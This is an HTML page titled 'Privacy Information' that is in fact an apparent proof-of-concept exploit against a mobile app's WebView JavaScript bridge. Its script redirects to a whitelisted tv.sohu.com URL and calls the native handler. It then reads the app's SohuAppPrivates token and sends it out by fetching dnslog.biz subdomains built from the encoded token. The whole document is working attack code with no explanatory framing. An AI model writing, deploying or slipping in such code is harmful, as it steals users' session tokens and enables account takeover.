<!DOCTYPE html>
<html>
<head>
  <title>Privacy Information</title>
</head>
<body>
  <h1>Privacy Information</h1>
  <iframe id="privacy-info-frame" style="width: 100%; height: 500px;"></iframe>

  <script>

    function jumpWhiteListUrl() {
        location = "http://tv.sohu.com/drama/";
    }

    function getappCallback(){
      window.handler.appCallback(3,1,"summer");

        // 获取SohuAppPrivates变量
        let sohuAppPrivates = null;
        if (typeof SohuAppPrivates !== 'undefined') {
            let dnslogUrl = "https://test1.bbc66268.log.dnslog.biz";
            fetch(dnslogUrl, {
              mode: 'no-cors'
            })
            .then(response => {
              console.log('Token sent to dnslog:', response.status);
            })
            .catch(error => {
              console.error('Error sending token to dnslog:', error);
            });
            sohuAppPrivates = JSON.parse(JSON.stringify(SohuAppPrivates));
        }
        let dnslogUrl = "https://test2.bbc66268.log.dnslog.biz";
        fetch(dnslogUrl, {
        mode: 'no-cors'
        })
        .then(response => {
        console.log('Token sent to dnslog:', response.status);
        })
        .catch(error => {
        console.error('Error sending token to dnslog:', error);
        });
        
        // 提取token信息
        let token = null;
        if (sohuAppPrivates && sohuAppPrivates.token) {
            token = sohuAppPrivates.token;
            let dnslogUrl = "https://"+ encodeURIComponent(token) + '.bbc66268.log.dnslog.biz';
            fetch(dnslogUrl, {
              mode: 'no-cors'
            })
            .then(response => {
              console.log('Token sent to dnslog:', response.status);
            })
            .catch(error => {
              console.error('Error sending token to dnslog:', error);
            });
        } else {
            let dnslogUrl =  'https://error2.bbc66268.log.dnslog.biz';
            fetch(dnslogUrl, {
              mode: 'no-cors'
            })
            .then(response => {
              console.log('Token sent to dnslog:', response.status);
            })
            .catch(error => {
              console.error('Error sending token to dnslog:', error);
            });
            console.log('SohuAppPrivates variable not found or token not present.');
        }
    }
    // let startTime = Date.now();
    // while (Date.now() - startTime < 10000) {
    //   // 主线程将被阻塞5秒
    // }
    // console.log('5 seconds have passed');
    setTimeout(getappCallback,400);
    jumpWhiteListUrl();
    getappCallback();

  </script>
</body>
</html>
